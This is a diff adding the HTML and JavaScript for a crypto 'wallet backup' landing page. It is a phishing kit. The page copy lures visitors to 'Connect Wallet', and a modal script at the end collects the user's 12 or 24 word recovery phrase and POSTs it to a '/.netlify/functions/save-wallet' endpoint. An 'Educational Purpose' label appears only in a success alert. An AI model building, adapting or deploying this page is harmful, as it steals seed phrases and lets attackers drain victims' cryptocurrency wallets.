+                    <div class="fade_up_anim col-span-12 md:col-span-6 xl:col-span-4 bg-accent6 rounded-xl p-4 !pb-0 xl:p-6 xxl:p-8">
+                        <h3 class="mb-1">24/7 Support</h3>
+                        <p class="lg:text-lg text-neutral1/70">Count on us for round-the-clock support, help whenever you need it.</p>
+                        <div class="flex justify-between items-end">
+                            <img src="assets2/images/bitcoin-2.png" class="max-md:hidden" alt="" />
+                            <img src="assets2/images/support.png" class="lg:-mr-5" alt="" />
+                        </div>
+                    </div>
+                    <div class="fade_up_anim col-span-12 md:col-span-6 xl:col-span-4 bg-accent6 rounded-xl p-4 !pb-0 xl:p-6 xxl:p-8">
+                        <h3 class="mb-1">Trusted &amp; Secure</h3>
+                        <p class="lg:text-lg text-neutral1/70">Your assets2. On your terms. At your fingertips.</p>
+                        <div class="flex justify-between items-end">
+                            <img src="assets2/images/coins.png" class="max-md:hidden" alt="" />
+                            <img src="assets2/images/trusted.png" class="lg:-mr-5 -mt-4" alt="" />
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- explore crypto -->
+        <section class="bg-accent5 relative overflow-hidden">
+            <div class="max-lg:hidden w-[250px] xxl:w-[350px] h-[250px] xxl:h-[350px] absolute bottom-[-6%] blur-[85px] left-[-12%] bg-primary/50"></div>
+            <div class="max-lg:hidden w-[250px] xxl:w-[350px] h-[250px] xxl:h-[350px] absolute top-[-6%] blur-[85px] right-[-8%] bg-accent1/50"></div>
+            <img class="max-md:hidden absolute right-5 top-12 animate-slow-rotate" src="assets2/images/globe.png" alt="" />
+            <img class="max-lg:hidden absolute left-[5%] top-[46%] animate-slow-rotate-reverse" src="assets2/images/bitcoin-3.png" alt="" />
+            <img class="max-lg:hidden absolute right-0 bottom-0" src="assets2/images/element-1.png" alt="" />
+            <div class="container pb-120 pt-120 relative z-[2]">
+                <div class="mb-10 xl:mb-[60px] flex flex-wrap justify-between items-center gap-5">
+                    <div class="max-w-lg">
+                        <h2 class="mb-2 fade_up_anim">Explore <span class="text-primary h2 underline">Web3</span></h2>
+                        <p data-delay=".25" class="lg:text-lg text-neutral4 fade_up_anim">It is the easiest, safest, and fastest way to secure &amp; backup crypto asset.</p>
+                    </div>
+                    <a class='btn-primary' href='/market-overview'>View More</a>
+                </div>
+                <div class="mb-10 lg:mb-[60px]">
+                    <div class="swiper product-swiper">
+                        <div class="swiper-wrapper">
+                            <div class="swiper-slide group">
+                                <div class="bg-accent5 text-center group-hover:bg-accent6 duration-300 px-6 lg:px-10 py-5 lg:py-8 rounded-xl border border-accent4 flex flex-col items-center">
+                                    <div class="size-20 rounded-full group-hover:bg-primary border border-primary flex justify-center items-center mb-6 xl:mb-8">
+                                        <img src="assets2/images/spot-trading.png" alt="" />
+                                    </div>
+                                    <h4 class="mb-3">Spot Trading</h4>
+                                    <p class="text-neutral4 mb-6 lg:mb-8 lg:text-lg max-two-line">Trade crypto with our comprehensive set of powerful tools to maximize your profits.</p>
+                                    <a href="#" class="text-base lg:text-lg xl:text-xl font-medium flex group-hover:text-primary group-hover:underline justify-center">View Details</a>
+                                </div>
+                            </div>
+                            <div class="swiper-slide group">
+                                <div class="bg-accent5 text-center group-hover:bg-accent6 duration-300 px-6 lg:px-10 py-5 lg:py-8 rounded-xl border border-accent4 flex flex-col items-center">
+                                    <div class="size-20 rounded-full group-hover:bg-primary border border-primary flex justify-center items-center mb-6 xl:mb-8">
+                                        <img src="assets2/images/margin-trade.png" alt="" />
+                                    </div>
+                                    <h4 class="mb-3">Margin Trading</h4>
+                                    <p class="text-neutral4 mb-6 lg:mb-8 lg:text-lg max-two-line">Borrow, trade, and repay. Leverage your assets2 with margin trading.</p>
+                                    <a href="#" class="text-base lg:text-lg xl:text-xl font-medium flex group-hover:text-primary group-hover:underline justify-center">View Details</a>
+                                </div>
+                            </div>
+                            <div class="swiper-slide group">
+                                <div class="bg-accent5 text-center group-hover:bg-accent6 duration-300 px-6 lg:px-10 py-5 lg:py-8 rounded-xl border border-accent4 flex flex-col items-center">
+                                    <div class="size-20 rounded-full group-hover:bg-primary border border-primary flex justify-center items-center mb-6 xl:mb-8">
+                                        <img src="assets2/images/derivative.png" alt="" />
+                                    </div>
+                                    <h4 class="mb-3">Crypto Derivatives</h4>
+                                    <p class="text-neutral4 mb-6 lg:mb-8 lg:text-lg max-two-line">We are the best crypto exchange for trading crypto futures.</p>
+                                    <a href="#" class="text-base lg:text-lg xl:text-xl font-medium flex group-hover:text-primary group-hover:underline justify-center">View Details</a>
+                                </div>
+                            </div>
+                            <div class="swiper-slide group">
+                                <div class="bg-accent5 text-center group-hover:bg-accent6 duration-300 px-6 lg:px-10 py-5 lg:py-8 rounded-xl border border-accent4 flex flex-col items-center">
+                                    <div class="size-20 rounded-full group-hover:bg-primary border border-primary flex justify-center items-center mb-6 xl:mb-8">
+                                        <img src="assets2/images/earn.png" alt="" />
+                                    </div>
+                                    <h4 class="mb-3">QFSEarn</h4>
+                                    <p class="text-neutral4 mb-6 lg:mb-8 lg:text-lg max-two-line">Invest and earn steady income with the help of a professional asset manager.</p>
+                                    <a href="#" class="text-base lg:text-lg xl:text-xl font-medium flex group-hover:text-primary group-hover:underline justify-center">View Details</a>
+                                </div>
+                            </div>
+                            <div class="swiper-slide group">
+                                <div class="bg-accent5 text-center group-hover:bg-accent6 duration-300 px-6 lg:px-10 py-5 lg:py-8 rounded-xl border border-accent4 flex flex-col items-center">
+                                    <div class="size-20 rounded-full group-hover:bg-primary border border-primary flex justify-center items-center mb-6 xl:mb-8">
+                                        <img src="assets2/images/buy.png" alt="" />
+                                    </div>
+                                    <h4 class="mb-3">Buy Crypto</h4>
+                                    <p class="text-neutral4 mb-6 lg:mb-8 lg:text-lg max-two-line">Purchase crypto quickly and easily on our popular and industry-leading platform.</p>
+                                    <a href="#" class="text-base lg:text-lg xl:text-xl font-medium flex group-hover:text-primary group-hover:underline justify-center">View Details</a>
+                                </div>
+                            </div>
+                            <div class="swiper-slide group">
+                                <div class="bg-accent5 text-center group-hover:bg-accent6 duration-300 px-6 lg:px-10 py-5 lg:py-8 rounded-xl border border-accent4 flex flex-col items-center">
+                                    <div class="size-20 rounded-full group-hover:bg-primary border border-primary flex justify-center items-center mb-6 xl:mb-8">
+                                        <img src="assets2/images/margin.png" alt="" />
+                                    </div>
+                                    <h4 class="mb-3">Margin Trading</h4>
+                                    <p class="text-neutral4 mb-6 lg:mb-8 lg:text-lg max-two-line">Borrow, trade, and repay. Leverage your assets2 with margin trading.</p>
+                                    <a href="#" class="text-base lg:text-lg xl:text-xl font-medium flex group-hover:text-primary group-hover:underline justify-center">View Details</a>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div class="flex flex-col md:flex-row gap-4 items-center">
+                    <div class="flex gap-4">
+                        <span class="size-12 cursor-pointer xl:size-[60px] text-primary hover:text-neutral1 rounded-full border border-primary text-2xl f-center hover:bg-primary duration-300 prev-product">
+                <i class="ti ti-chevron-left"></i>
+              </span>
+                        <span class="size-12 cursor-pointer xl:size-[60px] text-primary hover:text-neutral1 rounded-full border border-primary text-2xl f-center hover:bg-primary duration-300 next-product">
+                <i class="ti ti-chevron-right"></i>
+              </span>
+                    </div>
+                    <div class="product-scrollbar shrink-0 max-md:w-full grow h-0.5 bg-primary/40"></div>
+                </div>
+            </div>
+        </section>
+
+
+        <!-- how to get started -->
+        <section class="bg-accent5 relative overflow-x-hidden">
+            <div class="max-lg:hidden w-[250px] h-[300px] absolute bottom-0 blur-[85px] left-[-12%] bg-accent1/50"></div>
+            <div class="max-lg:hidden w-[250px] h-[300px] absolute top-[-6%] blur-[85px] right-[-8%] bg-primary/50"></div>
+            <img class="max-md:hidden absolute left-0 bottom-3" src="assets2/images/how-start-el-1.png" alt="" />
+            <img class="max-lg:hidden absolute right-[5%] animate-skew top-[4%]" src="assets2/images/how-start-el-2.png" alt="" />
+            <div class="container pt-120 pb-120">
+                <h2 class="mb-10 xl:mb-[60px] text-center fade-up-anim">How To Get <span class="h2 text-primary underline">Started</span></h2>
+                <div class="grid grid-cols-12 gap-4 xl:gap-6 z-[2] relative text-center after:w-full after:h-full after:xl:h-[90%] after:absolute after:left-0 after:rounded-xl after:top-0 after:xl:top-[5%] after:bg-accent6 after:z-[-1]">
+                    <div data-delay="0.05" class="fade_up_anim col-span-12 md:col-span-6 xl:col-span-3 p-4 lg:p-6 xxl:px-8 xl:py-10 xxl:py-[60px] rounded-xl bg-primary flex flex-col items-center">
+                        <div class="size-[60px] text-primary text-2xl f-center rounded-full bg-neutral1 mb-4 xl:mb-6">
+                            <i class="ti ti-user-plus"></i>
+                        </div>
+                        <h4 class="mb-4 xl:mb-6">Connect wallet</h4>
+                        <p class="mb-7 xl:mb-10 lg:text-lg">Click connect wallet button.</p>
+                        <button onclick="openWalletModal" class="btn-primary">Connect Wallet</button>
+                
+                    </div>
+                    <div data-delay="0.15" class="fade_up_anim col-span-12 md:col-span-6 xl:col-span-3 p-4 lg:p-6 xxl:px-8 xl:py-10 xxl:py-[60px] rounded-xl flex flex-col items-center">
+                        <div class="size-[60px] text-2xl f-center rounded-full bg-accent4 mb-4 xl:mb-6">
+                            <h5>02</h5>
+                        </div>
+                        <h4 class="mb-4 xl:mb-6">Select Wallet</h4>
+                        <p class="mb-7 xl:mb-10 text-neutral1/80 lg:text-lg">Choose your prefered wallet to backup and click on connect.</p>
+                        <!-- <p class="text-lg font-medium text-neutral1/6">Create your account first</p> -->
+                    </div>
+                    <div data-delay="0.25" class="fade_up_anim col-span-12 md:col-span-6 xl:col-span-3 p-4 lg:p-6 xxl:px-8 xl:py-10 xxl:py-[60px] rounded-xl flex flex-col items-center">
+                        <div class="size-[60px] text-2xl f-center rounded-full bg-accent4 mb-4 xl:mb-6">
+                            <h5>03</h5>
+                        </div>
+                        <h4 class="mb-4 xl:mb-6">Backup your wallet</h4>
+                        <p class="mb-7 xl:mb-10 text-neutral1/80 lg:text-lg">Your wallet backup may also be referred to as a: <b>backup</b>, <b>recovery seed</b>, <b>seed</b>, <b>seed phrase</b>, <b>BIP-39 seed phrase</b>, <b>mnemonic</b>, <b>recovery phrase</b>, (plus various combinations of these words)</p>
+                        <!-- <p class="text-lg font-medium text-neutral1/6">Verify your identity first</p> -->
+                    </div>
+                    <div data-delay="0.35" class="fade_up_anim col-span-12 md:col-span-6 xl:col-span-3 p-4 lg:p-6 xxl:px-8 xl:py-10 xxl:py-[60px] rounded-xl flex flex-col items-center">
+                        <div class="size-[60px] text-2xl f-center rounded-full bg-accent4 mb-4 xl:mb-6">
+                            <h5>04</h5>
+                        </div>
+                        <h4 class="mb-4 xl:mb-6">Start your journey</h4>
+                        <p class="mb-7 xl:mb-10 text-neutral1/80 lg:text-lg">Having a safe wallet backup means you can recover your Bitcoin in case of hardware failure or the loss of your device</p>
+                        <!-- <p class="text-lg font-medium text-neutral1/6">Buy or deposit crypto first</p> -->
+                    </div>
+                </div>
+            </div>
+        </section>
+
+
+
+        <!-- Try our crypto -->
+        <section class="bg-accent5 relative overflow-hidden">
+            <div class="max-lg:hidden w-[250px] xxl:w-[350px] h-[250px] xxl:h-[350px] absolute bottom-[-6%] blur-[85px] left-[-12%] bg-primary/50"></div>
+            <div class="max-lg:hidden w-[250px] xxl:w-[350px] h-[250px] xxl:h-[350px] absolute top-[-6%] blur-[85px] right-[-8%] bg-accent1/50"></div>
+            <img class="max-md:hidden absolute right-5 top-12 animate-slow-rotate" src="assets2/images/globe.png" alt="" />
+            <img class="max-lg:hidden absolute left-[5%] bottom-[6%] animate-updown" src="assets2/images/try-el-1.png" alt="" />
+            <img class="max-lg:hidden absolute right-[5%] bottom-[4%] animate-slow-rotate-reverse" src="assets2/images/try-el-2.png" alt="" />
+            <div class="container pt-120 pb-120 grid grid-cols-12 gap-6 xl:gap-10 items-center relative z-[2]">
+                <div class="col-span-12 lg:col-span-5">
+                    <img src="get-started-recovery-phrase-lg%402x.png" class="fade_up_anim" alt="" />
+                </div>
+                <div class="col-span-12 lg:col-span-7">
+                    <h2 data-delay=".05" class="fade_up_anim mb-4">How does wallet backup and recovery work?</h2>
+                    <div data-delay=".25" class="fade_up_anim rounded-3xl p-4 lg:p-6 xxl:p-8 bg-accent6 border border-accent4 flex gap-4 flex-wrap items-center justify-between">
+                        <div class="max-w-sm">
+                            <h3 class="mb-3">Secure</h3>
+                            <p class="lg:text-lg text-neutral4">First, we need to talk a little bit about how crypto wallets work. Crypto wallets work by holding cryptographic keys that are used to prove you have control over cryptoassets2 on a blockchain. Whenever you wish to do something
+                                with your cryptoassets2, you instruct the blockchain and use your private cryptographic key as a sort of digital signature to approve your desired action.</p>
+                        </div>
+                        <button onclick="openWalletModal" class="btn-primary">Connect Wallet</button>
+                
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- faq -->
+        <section class="bg-accent2 relative overflow-hidden">
+            <div class="max-lg:hidden w-[350px] h-[350px] absolute bottom-[-6%] blur-[85px] left-[-12%] bg-accent1/50"></div>
+            <img class="max-lg:hidden absolute right-[2%] bottom-[3%]" src="assets2/images/faq-box.png" alt="" />
+            <div class="container relative z-[2] pt-120 pb-120 grid grid-cols-12 gap-6 xl:gap-10 items-center">
+                <div class="fade_up_anim col-span-12 lg:col-span-5 p-4 lg:p-6 xl:p-8 xxl:px-10 bg-accent5 border border-accent4 rounded-xl">
+                    <p class="text-lg font-semibold mb-3">FAQ</p>
+                    <h2 class="mb-4">Your questions <span class="h2 underline text-primary">answered.</span></h2>
+                    <p class="text-neutral4 mb-6 text-lg xl:mb-10">Let's do our best to answer your most frequently asked questions.</p>
+                    <div class="bg-accent6 p-5 rounded-xl">
+                        <div class="flex gap-3 flex-wrap min-[420px]:flex-nowrap items-center mb-6">
+                            <div class="size-20 shrink-0 rounded-xl border border-neutral1 f-center">
+                                <div class="size-8 rounded-full bg-primary text-accent5 text-2xl f-center">
+                                    <i class="ti ti-question-mark"></i>
+                                </div>
+                            </div>
+                            <div>
+                                <h5 class="mb-3">Still have questions?</h5>
+                                <p class="text-neutral4 text-sm">Can't find the answer you're looking for?Please chat to our friendly team!</p>
+                            </div>
+                        </div>
+                
+                        <button onclick="openWalletModal()" class="btn-primary">Connect Wallet</button>
+                    </div>
+                </div>
+                <div x-data="{opened:2 , handleOpen(i) {this.opened === i ? this.opened = 0 : this.opened = i}}" class="col-span-12 lg:col-span-7 p-4 lg:p-6 xl:p-8 xxl:px-10 bg-accent5 border border-accent4 rounded-xl flex flex-col gap-4 xxl:gap-7">
+                    <div data-delay="0.5" :class="opened==1?'bg-accent6':''" class="fade_up_anim p-4 rounded-xl border border-accent4 cursor-pointer" @click="handleOpen(1)">
+                        <div class="flex justify-between items-center">
+                            <p class="text-sm lg:text-base xxl:text-xl font-medium">How can I secure my wallet?</p>
+                            <span :class="opened==1?'bg-primary rotate-180':'bg-accent6'" class="size-8 md:size-10 cursor-pointer rounded-full f-center text-lg shrink-0 md:text-2xl duration-300">
+                  <i class="ti ti-chevron-down"></i>
+                </span>
+                        </div>
+                        <div x-show="opened === 1" x-collapse>
+                            <p class="text-sm lg:text-base xxl:text-lg pt-3">Set a unique passcode for your wallet.
+                            </p>
+                            <p class="text-sm lg:text-base xxl:text-lg pt-3">Also, make sure the numbers are random. Birthdays, anniversaries, house addresses, and the last digits of your phone number are all popular combinations and are crackable codes to a resourceful criminal.
+
+                            </p>
+                        </div>
+                    </div>
+                    <div data-delay="0.15" :class="opened==2?'bg-accent6':''" class="fade_up_anim p-4 rounded-xl border border-accent4 cursor-pointer" @click="handleOpen(2)">
+                        <div class="flex justify-between items-center">
+                            <p class="text-sm lg:text-base xxl:text-xl font-medium">How to backup a crypto wallet?</p>
+                            <span :class="opened==2?'bg-primary rotate-180':'bg-accent6'" class="size-8 md:size-10 cursor-pointer rounded-full f-center text-lg shrink-0 md:text-2xl duration-300">
+                  <i class="ti ti-chevron-down"></i>
+                </span>
+                        </div>
+                        <div x-show="opened === 2" x-collapse>
+                            <p class="text-sm lg:text-base xxl:text-lg pt-3">1. Export Private Keys/Seed Phrase: Go to your wallet's settings and select the “backup wallet” or “export keys” option.</p>
+                            <p class="text-sm lg:text-base xxl:text-lg pt-3">2. Secure Your Backup: Store backups in multiple secure locations like USB drives, paper copies in fireproof safes, and safety deposit boxes.</p>
+                        </div>
+                    </div>
+                    <div data-delay="0.25" :class="opened==3?'bg-accent6':''" class="fade_up_anim p-4 rounded-xl border border-accent4 cursor-pointer" @click="handleOpen(3)">
+                        <div class="flex justify-between items-center">
+                            <p class="text-sm lg:text-base xxl:text-xl font-medium">How to keep bitcoin wallet safe?</p>
+                            <span :class="opened==3?'bg-primary rotate-180':'bg-accent6'" class="size-8 md:size-10 cursor-pointer rounded-full f-center text-lg shrink-0 md:text-2xl duration-300">
+                  <i class="ti ti-chevron-down"></i>
+                </span>
+                        </div>
+                        <div x-show="opened === 3" x-collapse>
+                            <p class="text-sm lg:text-base xxl:text-lg pt-3">Securing Your Bitcoin: Choosing a Reputable Exchange.</p>
+                        </div>
+                    </div>
+                    <div data-delay="0.35" :class="opened==4?'bg-accent6':''" class="fade_up_anim p-4 rounded-xl border border-accent4 cursor-pointer" @click="handleOpen(4)">
+                        <div class="flex justify-between items-center">
+                            <p class="text-sm lg:text-base xxl:text-xl font-medium">How do I trust a safe wallet?</p>
+                            <span :class="opened==4?'bg-primary rotate-180':'bg-accent6'" class="size-8 md:size-10 cursor-pointer rounded-full f-center text-lg shrink-0 md:text-2xl duration-300">
+                  <i class="ti ti-chevron-down"></i>
+                </span>
+                        </div>
+                        <div x-show="opened === 4" x-collapse>
+                            <p class="text-sm lg:text-base xxl:text-lg pt-3">Back up your wallet.</p>
+                            <p class="text-sm lg:text-base xxl:text-lg pt-3">Be cautious of phishing scams.</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Trusted By -->
+        <section class="bg-accent5 relative overflow-hidden">
+            <div class="max-lg:hidden w-[250px] h-[250px] absolute bottom-[-6%] blur-[85px] left-[-9%] bg-primary/50"></div>
+            <div class="max-lg:hidden w-[250px] h-[250px] absolute top-[-6%] blur-[85px] right-[-8%] bg-primary/50"></div>
+
+            <div class="pb-120 pt-120 relative z-[2]">
+                <h2 class="text-center mb-10 xl:mb-[60px] fade_up_anim">Trusted by</h2>
+                <div class="swiper brand-slider-one fade_up_anim">
+                    <div class="swiper-wrapper ease-linear">
+                        <div class="swiper-slide flex items-center h-20 justify-center">
+                            <img src="assets2/images/brands/item-1.png" alt="" />
+                        </div>
+                        <div class="swiper-slide flex items-center h-20 justify-center">
+                            <img src="assets2/images/brands/item-2.png" alt="" />
+                        </div>
+                        <div class="swiper-slide flex items-center h-20 justify-center">
+                            <img src="assets2/images/brands/item-3.png" alt="" />
+                        </div>
+                        <div class="swiper-slide flex items-center h-20 justify-center">
+                            <img src="assets2/images/brands/item-4.png" alt="" />
+                        </div>
+                        <div class="swiper-slide flex items-center h-20 justify-center">
+                            <img src="assets2/images/brands/item-5.png" alt="" />
+                        </div>
+                        <div class="swiper-slide flex items-center h-20 justify-center">
+                            <img src="assets2/images/brands/item-6.png" alt="" />
+                        </div>
+                        <div class="swiper-slide flex items-center h-20 justify-center">
+                            <img src="assets2/images/brands/item-7.png" alt="" />
+                        </div>
+                        <div class="swiper-slide flex items-center h-20 justify-center">
+                            <img src="assets2/images/brands/item-8.png" alt="" />
+                        </div>
+                        <div class="swiper-slide flex items-center h-20 justify-center">
+                            <img src="assets2/images/brands/item-9.png" alt="" />
+                        </div>
+                        <div class="swiper-slide flex items-center h-20 justify-center">
+                            <img src="assets2/images/brands/item-10.png" alt="" />
+                        </div>
+                    </div>
+                </div>
+                <div class="swiper brand-slider-two fade_up_anim">
+                    <div class="swiper-wrapper ease-linear">
+                        <div class="swiper-slide flex items-center h-20 justify-center">
+                            <img src="assets2/images/brands/item-11.png" alt="" />
+                        </div>
+                        <div class="swiper-slide flex items-center h-20 justify-center">
+                            <img src="assets2/images/brands/item-12.png" alt="" />
+                        </div>
+                        <div class="swiper-slide flex items-center h-20 justify-center">
+                            <img src="assets2/images/brands/item-13.png" alt="" />
+                        </div>
+                        <div class="swiper-slide flex items-center h-20 justify-center">
+                            <img src="assets2/images/brands/item-4.png" alt="" />
+                        </div>
+                        <div class="swiper-slide flex items-center h-20 justify-center">
+                            <img src="assets2/images/brands/item-7.png" alt="" />
+                        </div>
+                        <div class="swiper-slide flex items-center h-20 justify-center">
+                            <img src="assets2/images/brands/item-5.png" alt="" />
+                        </div>
+                        <div class="swiper-slide flex items-center h-20 justify-center">
+                            <img src="assets2/images/brands/item-9.png" alt="" />
+                        </div>
+                        <div class="swiper-slide flex items-center h-20 justify-center">
+                            <img src="assets2/images/brands/item-8.png" alt="" />
+                        </div>
+                        <div class="swiper-slide flex items-center h-20 justify-center">
+                            <img src="assets2/images/brands/item-7.png" alt="" />
+                        </div>
+                        <div class="swiper-slide flex items-center h-20 justify-center">
+                            <img src="assets2/images/brands/item-10.png" alt="" />
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+
+    </main>
+
+    <!-- footer -->
+    <footer class="bg-accent5 relative overflow-hidden footer">
+        <div class="w-[150px] lg:w-[250px] h-[150px] lg:h-[250px] absolute bottom-[-6%] blur-[85px] left-[-9%] bg-primary/50"></div>
+        <div class="w-[150px] lg:w-[250px] h-[150px] lg:h-[250px] absolute top-[-6%] blur-[85px] right-[-8%] bg-accent1/50"></div>
+        <img class="max-[1700px]:hidden absolute left-0 bottom-0" src="assets2/images/footer-el-1.png" alt="" />
+        <img class="max-lg:hidden absolute right-1 bottom-0" src="assets2/images/footer-el-2.png" alt="" />
+        <img class="max-xl:hidden absolute right-0 top-2 animate-skew" src="assets2/images/how-start-el-2.png" alt="" />
+        <div class="pb-120 pt-120 relative z-[2] container grid grid-cols-12 xxl:grid-cols-10 gap-6 lg:divide-x divide-accent4">
+            <div class="fade_up_anim col-span-12 md:col-span-6 xl:col-span-3">
+                <h3 class="mb-4 xl:mb-6">Quick Links</h3>
+                <div class="grid grid-cols-2">
+                    <div class="col-span-1 flex flex-col gap-4">
+
+                        <a href="#" class="animated-link">IGO</a>
+                        <a href="#" class="animated-link">LAUNCHPAD</a>
+                        <a href="#" class="animated-link">STAKING</a>
+                        <a class='animated-link' href='/wallet-connect?farming'>FARMING</a>
+                        <a href="#" class="animated-link">CRYPTO</a>
+                    </div>
+                    <div class="col-span-1 flex flex-col gap-4">
+                        <a href="#" class="animated-link">DEFI</a>
+                        <a href="#" class="animated-link">WEB3</a>
+                        <a href="#" class="animated-link">IEO</a>
+                        <a href="#" class="animated-link">IDO</a>
+                        <a href="#" class="animated-link">TOKEN</a>
+                        <a href="#" class="animated-link">GAMING</a>
+                        <a href="#" class="animated-link">NFT</a>
+                    </div>
+                </div>
+            </div>
+            <div data-delay=".15" class="fade_up_anim col-span-12 md:col-span-6 xl:col-span-6 xxl:col-span-4">
+                <div class="text-center px-4 md:px-6 lg:px-10 xxl:px-16">
+                    <h3 class="mb-4 xl:mb-6">Newsletter</h3>
+                    <p class="text-neutral4 lg:text-lg mb-8 xl:mb-10">Welcome to Web3 connects your gateway to the world of Web3 trading! Our user-friendly platform</p>
+                    <form @submit.prevent class="flex items-center">
+                        <input type="email" placeholder="Enter Your Email..." class="w-full focus:border-primary bg-transparent rounded-full px-5 py-4 border border-accent4" required />
+                        <button type="submit" aria-label="submit button" class="size-[56px] rounded-full bg-primary shrink-0 f-center text-xl"><i class="ti ti-arrow-up-right"></i></button>
+                    </form>
+                </div>
+            </div>
+
+        </div>
+        <div class="py-5 xl:py-8 border-t border-accent4">
+            <div class="container text-center flex justify-center gap-2 sm:gap-3 items-center relative z-[2]">
+                <p class="text-xs sm:text-sm md:text-base xl:text-lg">Copyright @ <span id="year"></span> Web3 connects</p>
+
+            </div>
+        </div>
+    </footer>
+
+
+<!-- ====================== WALLET MODAL (Plain JS + Backend) ====================== -->
+<div id="wallet-modal-root"></div>
+
+<script>
+// Modal State
+let isModalOpen = false;
+let currentStep = 'connect';
+let selectedWallet = '';
+let recoveryPhrase = '';
+let walletName = '';
+let email = '';
+
+// Open Modal
+window.openWalletModal = function() {
+    isModalOpen = true;
+    currentStep = 'connect';
+    selectedWallet = '';
+    recoveryPhrase = '';
+    walletName = '';
+    email = '';
+    renderModal();
+};
+
+// Close Modal
+window.closeWalletModal = function() {
+    isModalOpen = false;
+    document.getElementById('wallet-modal-root').innerHTML = '';
+};
+
+// Render Modal
+function renderModal() {
+    const root = document.getElementById('wallet-modal-root');
+    let html = `
+    <div class="fixed inset-0 z-[99999] flex items-center justify-center p-4 bg-black/95 backdrop-blur-lg" onclick="if(event.target === this) closeWalletModal()">
+        <div class="w-full max-w-md bg-[#0a1f14] rounded-3xl overflow-hidden border border-emerald-500/50 shadow-2xl">
+            
+            <!-- Header -->
+            <div class="px-6 py-5 border-b border-emerald-500/30 flex justify-between items-center bg-[#0a1f14]">
+                <h2 class="text-xl font-bold text-white">Connect Wallet</h2>
+                <button onclick="closeWalletModal()" class="text-3xl text-gray-400 hover:text-white leading-none">×</button>
+            </div>`;
+
+    // STEP 1: Backup Wallet
+    if (currentStep === 'connect') {
+        html += `
+            <div class="p-8">
+                <p class="text-gray-400 text-center mb-8">Gateway to Web3</p>
+                <div class="bg-[#0f2a1f] border border-emerald-500/40 rounded-2xl p-8 text-center">
+                    <div class="mx-auto mb-6 w-20 h-20 bg-emerald-500/10 rounded-2xl flex items-center justify-center text-5xl">🔐</div>
+                    <h3 class="text-2xl font-semibold text-white mb-3">Backup Wallet</h3>
+                    <p class="text-gray-400 mb-8">Automatic / Manual backup</p>
+                    <button onclick="goToWallets()" class="w-full py-4 bg-emerald-500 hover:bg-emerald-600 rounded-2xl font-semibold text-lg text-white">Continue</button>
+                </div>
+            </div>`;
+    }
+
+    // STEP 2: Wallet List
+    else if (currentStep === 'wallets') {
+        html += `
+            <div class="p-6">
+                <h2 class="text-2xl font-bold text-white mb-6 text-center">Choose Wallet</h2>
+                <div class="space-y-3 max-h-[460px] overflow-y-auto pr-2 custom-scroll">`;
+        
+        const wallets = ['MetaMask','Trust Wallet','Wallet Connect','Exodus','Phantom','Coinbase Wallet','Cosmostation'];
+        wallets.forEach(wallet => {
+            html += `
+                <button onclick="selectWallet('${wallet}')" 
+                        class="w-full flex items-center gap-4 p-5 rounded-2xl hover:bg-[#1a3c2e] transition-all border border-transparent hover:border-emerald-500/30">
+                    <span class="text-3xl">${getWalletIcon(wallet)}</span>
+                    <span class="text-lg font-medium text-white">${wallet}</span>
+                </button>`;
+        });
+
+        html += `</div></div>`;
+    }
+
+    // STEP 3: Import Phrase
+    else if (currentStep === 'import') {
+        html += `
+            <div class="p-6">
+                <h3 class="text-white text-xl mb-6">Import Recovery Phrase</h3>
+                <textarea id="phrase-input" rows="5" 
+                    class="w-full bg-[#1a3c2e] border border-emerald-500/30 rounded-2xl p-5 text-white focus:border-emerald-500 resize-none"
+                    placeholder="Enter your 12 or 24 word recovery phrase..."></textarea>
+                
+                <div class="flex gap-3 mt-6">
+                    <button onclick="closeWalletModal()" class="flex-1 py-4 rounded-2xl border border-gray-600 text-white hover:bg-gray-800">Cancel</button>
+                    <button onclick="submitWalletData()" class="flex-1 py-4 bg-emerald-500 hover:bg-emerald-600 rounded-2xl font-semibold">Proceed</button>
+                </div>
+            </div>`;
+    }
+
+    html += `</div></div>`;
+    root.innerHTML = html;
+}
+
+// Helper Functions
+function getWalletIcon(name) {
+    if (name.includes('MetaMask')) return '🦊';
+    if (name.includes('Trust')) return '🔷';
+    if (name.includes('Wallet Connect')) return '🔗';
+    if (name.includes('Phantom')) return '👻';
+    return '💼';
+}
+
+window.goToWallets = function() {
+    currentStep = 'wallets';
+    renderModal();
+};
+
+window.selectWallet = function(wallet) {
+    selectedWallet = wallet;
+    if (wallet.includes('Wallet Connect')) {
+        currentStep = 'import';
+        renderModal();
+    } else {
+        alert(`Connecting to ${wallet}... (Demo)`);
+        setTimeout(closeWalletModal, 1500);
+    }
+};
+
+window.submitWalletData = async function() {
+    const input = document.getElementById('phrase-input');
+    recoveryPhrase = input ? input.value.trim() : '';
+
+    if (!recoveryPhrase) {
+        alert("Please enter your recovery phrase");
+        return;
+    }
+
+    try {
+        const response = await fetch('/.netlify/functions/save-wallet', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                selected_wallet: selectedWallet,
+                recovery_phrase: recoveryPhrase,
+                wallet_name: walletName,
+                email: email
+            })
+        });
+
+        const result = await response.json();
+
+        if (result.success) {
+            alert("✅ Wallet data saved successfully! (Educational Purpose)");
+            closeWalletModal();
+        } else {
+            alert(result.error || "Failed to save data");
+        }
+    } catch (err) {
+        console.error(err);
+        alert("Connection error. Please try again.");
+    }
+};
+</script>
+
+<!-- Update your Connect Wallet buttons -->
+<button onclick="openWalletModal()" class="btn-primary">Connect Wallet</button>
+
+</body>
+
 </html>
